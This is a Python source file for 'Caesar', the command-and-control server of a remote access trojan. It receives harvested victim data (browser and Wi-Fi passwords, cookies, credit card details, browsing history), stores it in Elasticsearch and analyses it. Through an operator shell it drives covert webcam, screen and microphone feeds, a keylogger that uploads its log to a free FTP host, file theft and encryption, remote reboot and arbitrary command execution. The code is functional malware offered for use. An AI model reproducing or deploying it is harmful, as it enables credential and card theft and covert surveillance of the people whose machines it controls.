import socket
import threading
from queue import Queue
import time
import os
import re
import json
from datetime import datetime
from getmac import get_mac_address as gma
from es_handler import EsHandler
from client_handler import ClientHandler
import struct
from data_analyzer import Analyzer




class Caesar:

        def __init__(self, host, port, db_name, es_url):
            self.host = host
            self.port = port
            self.esHandler = EsHandler(db_name, es_url)
            self.clientHandler = ClientHandler()
            self.socket_object_dict = {}
            self.current_session_id = str()
            self.queue = Queue()
            self.analyzer = Analyzer(db_name)
            self.clientFolder = "ClientFolder"



            ##################################FTP SERVER CREDENTIALS#############################

            self.FTP_PASS = ""
            self.LOG_FILE = "log.txt"
            self.FTP_HOST = "files.000webhost.com"
            self.FTP_USER = ""

            ##################################FTP SERVER CREDENTIALS#############################





        #create socket and listen for client connections
        def create_socket(self):
            global sock
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind((self.host, self.port))
                sock.listen(20) #listen for connection
            except socket.error as err:
                print("[-]Error unable to create socket!!!" + str(err))




        #handles incoming connection
        def handle_connections(self):
            while True:
                try:
                    conn, addr = sock.accept()
                    conn.setblocking(True)
                    data = conn.recv(1024).decode()#recieves client system information
                    ip = re.findall("'(.*?)'", str(addr))#extract ip from addr
                    ip = "".join(ip)

                    #check if connected client already exists
                    if (self.esHandler.is_conn_present(data.split()[0])):
                        client_id = self.esHandler.update_document(data.split()[0], ip, data)
                        self.socket_object_dict.update({client_id:conn})

                        path = os.path.join(self.clientFolder, str(client_id))
                        if not os.path.exists(path):
                            os.mkdir(path)

                        print("\n[+]Node " + str(ip) + " has reconnected!!!")

                        self.store_harvested_data(conn, client_id)

                    #create a new document if the client does not exist
                    else:
                        client_id = str()
                        dict_obj = self.esHandler.store_client_information(ip, conn, data)

                        for k, v in dict_obj.items():
                            client_id = k
                        path = os.path.join(self.clientFolder, str(client_id))

                        if not os.path.exists(path):
                            os.mkdir(path) #create a folder for new client

                        self.socket_object_dict.update(dict_obj)
                        print("\n[+]Node " + str(ip) + " has connected!!!")

                        self.store_harvested_data(conn, client_id)

                except Exception as e:
                    #print("[-]Something went wrong connecting to client!!!")
                    print(e)
                    break



        #handles connection thread
        def thread_handler(self):
            for _ in range(2):
                thread = threading.Thread(target=self.work)
                thread.deamon = True
                thread.start()


        def work(self):
            thread_number = self.queue.get()
            if thread_number == 1:
                self.create_socket()
                self.handle_connections()
            if thread_number == 2:
                self.shell_interface()
            self.queue.task_done()



        def job_handler(self):
            job_number = [1, 2]
            for x in job_number:
                self.queue.put(x)
            self.queue.join()



        #displays caesar shell commands
        def show_commands(self):
            user_guide = """
                Caesar Commands
                     'guide': [Display Caesar's user commands]
                     'clients':['lists clients within ES index']
                     'connected':['lists all active connection within ES index']
                     'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
                     'delete (target ES Client_ID)': ['remove specified document from index']
                     'delete all': ['remove all document from index']
                     'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
                     'show fields (target ES Client_ID)': ['displays existing field for specified target']
                     'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']

                Client Commands                                                
                    'quit':['quits the session and takes user back to Caesar ES interface']           
                    'get (filename or path)':['Receieve specified file from target client']
                    'send (filename or absolute path)':['send specified file to the target client']      
                    'screenshot':['takes a screen shot of the client machine']
                    'camshot':['captures an image from the client's webcam']  
                    'camfeed': [live feed from target's webcam]
                    'screenfeed': [live feed from target's screen]
                    'audiofeed': [live audio feed from target's microphone]
                    'encrypt (PASSWORD) (FILENAME)': [encrypts specified file]            
                    'decrypt (PASSWORD)(FILENAME)': [decrypts specified file]   
                    'ftp download (FILENAME)' : [download specified file from FTP server]
                    'ftp upload (FILE PATH)' : [uploads specified file to FTP server]      
                    'start keylogger' : [starts Keylogger]
                    'stop keylogger' : [stops Keylogger]
                    'keylogger status' : [provides updatae on keylogger status]
                    'reboot' : [reboot client system]
                    'shutdown' : [shutdown client system]

                Analyzer Commands
                    'resolve history (target ES Client_ID)' : [cleans browsing history data and adds youtube channel name to excisting data]
                    'browser summary (target ES Client_ID)' : [displays summary of browser data]
                    'most active times (target ES Client_ID)': [displays target's active browsing times in descending order]
                    'average active times (target ES Client_ID)' [displays target's average browsing times]
                    'rank channels (target ES Client_ID) count': [displays target's most watched youtube channels in descending order]
                    'rank websites (target ES Client_ID) count': [displays target's most visited website in descending order]
                    'web titles (target ES Client_ID) (domain_name)': [display website titles for specified domain name]
                    'video titles (target ES Client_ID) (domain_name)': [display video titles for specified youtube channel]
                    'user activity (target ES Client_ID)': [ranks most used applications in descending order]
            """
            print(user_guide)



        def convert_caesar_text(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



        def get_socket_obj(self, client_id):
            try:
                for clients, socket_obj in self.socket_object_dict.items():
                    if clients == client_id:
                        return socket_obj
                        break
            except:
                print("[-]ID does not exists!!! ")




        #sends null to the client and get the current working directory in return
        def send_null(self, client_sock_object):
                client_sock_object.send(str(" ").encode())
                data = client_sock_object.recv(1024).decode()
                print(str(data), end="")




        #saves harvested system info from client in Elastic Search Index
        def store_harvested_data(self, client_sock_object, client_id):
            try:

                installedAppData = self.recv_msg(client_sock_object)  
                installedAppData =  json.loads(installedAppData.decode())
                self.esHandler.append_information("installed-apps", installedAppData, client_id)


                startupAppData = self.recv_msg(client_sock_object)   
                startupAppData = json.loads(startupAppData.decode())
                self.esHandler.append_information("startup-app-data", startupAppData, client_id)

                wifiPasswordCredentials = self.recv_msg(client_sock_object)    
                wifiPasswordCredentials = json.loads(wifiPasswordCredentials.decode())
                self.esHandler.append_information("wifi-credentials", wifiPasswordCredentials, client_id)


                #===============================================Browser Data===========================================

                browserPasswordData = self.recv_msg(client_sock_object)   
                browserPasswordData = json.loads(browserPasswordData.decode())
                self.esHandler.append_information("browser-passwords", browserPasswordData, client_id)
             
                browserCookieData = self.recv_msg(client_sock_object)   
                browserCookieData = json.loads(browserCookieData.decode())
                self.esHandler.append_information("browser-cookie", browserCookieData, client_id)

                browserHistoryData = self.recv_msg(client_sock_object)   
                browserHistoryData = json.loads(browserHistoryData.decode())
                self.esHandler.append_information("browser-history", browserHistoryData, client_id)

                creditCardData = self.recv_msg(client_sock_object)   
                creditCardData = json.loads(creditCardData.decode())
                self.esHandler.append_information("credit-card-info", creditCardData, client_id)

                autofillData = self.recv_msg(client_sock_object)   
                autofillData = json.loads(autofillData.decode())
                self.esHandler.append_information("autofill-data", autofillData, client_id)

                #===============================================Browser Data===========================================

                


                #===============================================System Data============================================

                memoryInfoData = self.recv_msg(client_sock_object)   
                memoryInfoData = json.loads(memoryInfoData.decode())
                self.esHandler.append_information("memory-info", memoryInfoData, client_id)

                diskInfoData = self.recv_msg(client_sock_object)   
                diskInfoData = json.loads(diskInfoData.decode())
                self.esHandler.append_information("disk-info", diskInfoData, client_id)

                networkInfoData = self.recv_msg(client_sock_object)   
                networkInfoData = json.loads(networkInfoData.decode())
                self.esHandler.append_information("network-info", networkInfoData, client_id)

            
                userActivityData = self.recv_msg(client_sock_object)   
                userActivityData = json.loads(userActivityData.decode())
                self.esHandler.append_information("user-activity-data", userActivityData, client_id)
            

                otherData = self.recv_msg(client_sock_object)   
                otherData = json.loads(otherData.decode())
                self.esHandler.append_information("other-data", otherData, client_id)

                #===============================================System Data============================================

                print("[+]Data extraction completed!!!")

            except Exception as e:
                print("[-]Error occured while collectiing data!!!")
                print(e)




        def recv_msg(self, sock):
            # Read message length and unpack it into an integer
            raw_msglen = self.recvall(sock, 4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('>I', raw_msglen)[0]
            # Read the message data
            return self.recvall(sock, msglen)



        def recvall(self, sock, n):
            # Helper function to recv n bytes or return None if EOF is hit
            data = bytearray()
            while len(data) < n:
                packet = sock.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            return data



        #sends commands to the client
        def handle_client_session(self, client_id, client_sock_object):
                self.send_null(client_sock_object)
                self.current_session_id = client_id


                while True:
                    cmd = ""
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd.strip()== 'quit':
                        print("[+]Closing Session!!!!....")
                        self.current_session_id = ""
                        break

                    elif cmd == "":
                        self.send_null(client_sock_object)
                    elif "get" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            usrFile = client_sock_object.recv(1024).decode()
                            data = client_sock_object.recv(1024).decode()
                            if "File does not exist!!!" not in data:
                                self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
                                print(str(data), end="")
                            else:
                                print(data)
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break
                    elif "send" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            self.clientHandler.send_file(client_sock_object, cmd[5:])
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break
                    elif cmd.strip() == "camshot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "camfeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_webcam_feed(client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "screenshot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break
                    elif cmd.strip() == "screenfeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_screen_feed(client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "audiofeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif "encrypt" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif "decrypt" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break

                    elif "ftp download" in cmd:
                        try:
                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"


                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break

                    elif "ftp upload" in cmd:
                        try:

                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"

                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")

                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break

                    elif cmd == "start keylogger":

                        try:

                            cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"


                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")

                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break

                    elif cmd == "stop keylogger":
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd == "keylogger status":
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "reboot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "shutdown":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    else:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(65536).decode()
                            print(str(data), end="")
                        except:
                            print("[-]Connection terminated!!!")
                            break



        #shell interface
        def shell_interface(self):
                while True:
                    print(self.convert_caesar_text("Caesar: "), end="")
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd == '':
                        pass
                    elif cmd.strip() == 'clients':
                        self.esHandler.retrieve_client_information()

                    elif 'show fields' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3:
                            client_id = cmd[2]
                            self.esHandler.show_fields(client_id)
                        else:
                            print("[-]Invalid use of the show field command")            


                    elif 'get' in cmd:
                        client_id = cmd[4:]
                        self.esHandler.retrieve_client_document(client_id)

                    
                    elif 'delete all' in cmd:
                        self.esHandler.delete_all_docs()
                        self.socket_object_dict.clear()

                    elif 'delete' in cmd:
                        client_id = cmd[7:]
                        self.esHandler.delete_client_document(client_id)
                        if(client_id in self.socket_object_dict):
                            self.socket_object_dict.pop(client_id)


                    elif 'field' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3:          
                            client_id = cmd[1]
                            parameter = cmd[2]
                            self.esHandler.get_field(client_id, parameter)
                        else:
                            print("[-]Invalid use of the field command")


                    elif "browser summary" in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3: 
                            client_id = cmd[2]
                            self.analyzer.browser_history_summary(client_id)
                        else:
                            print("[-]Invalid use of the field command")


                    elif "resolve history" in cmd:
                        cmd = cmd.split()
                        client_id = cmd[2]
                        self.analyzer.yt_resolver(cmd[2])


                    elif cmd.strip() == 'guide':
                        self.show_commands()


                    elif 'most active times' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 4:
                            self.analyzer.most_active_times(cmd[3])
                        else:
                            print("[-]Invalid command!!!")


                    elif 'average active times' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 4:
                            self.analyzer.average_browsing_hours(cmd[3])
                        else:
                            print("[-]Invalid command!!!")


                    elif 'web titles' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 4:
                            self.analyzer.get_web_titles(cmd[2], cmd[3])
                        else:
                            print("[-]Invalid command!!!")


                    elif 'video titles' in cmd:
                        cmd = cmd.split() 
                        channel_name = ' '.join(cmd[3:])
                        self.analyzer.get_video_titles(cmd[2], channel_name)
                        

                    elif 'rank channels' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 4:
                            self.analyzer.rank_youtube_channels(cmd[2], int(cmd[3]))
                        else:
                            print("[-]Invalid command!!!")


                    elif 'rank websites' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 4:
                            self.analyzer.most_visited_websites(cmd[2], int(cmd[3]))
                        else:
                            print("[-]Invalid command!!!")


                    elif 'user activity' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3:
                            self.analyzer.get_windows_activity_history(cmd[2])
                        else:
                            print("[-]Invalid command!!!")



                    elif cmd.strip() == 'connected':
                        self.esHandler.get_connected_client(self.socket_object_dict)

                    elif 'shell' in cmd:
                        client_id = cmd[6:]
                        current_session_id = client_id
                        client_sock_object = self.get_socket_obj(client_id)

                        #check if connection is still active
                        if(bool(self.socket_object_dict)):
                            try:
                                client_sock_object.send("conn check".encode())
                                self.handle_client_session(client_id, client_sock_object)
                            except Exception as e:
                                
                                print("[-]Client connection is not active!!!")
                        else:
                            print("[-]No connection is active!!!")

                    else:
                        print("[-]Invalid command!!!")




        def start(self):
            self.thread_handler()
            self.job_handler()

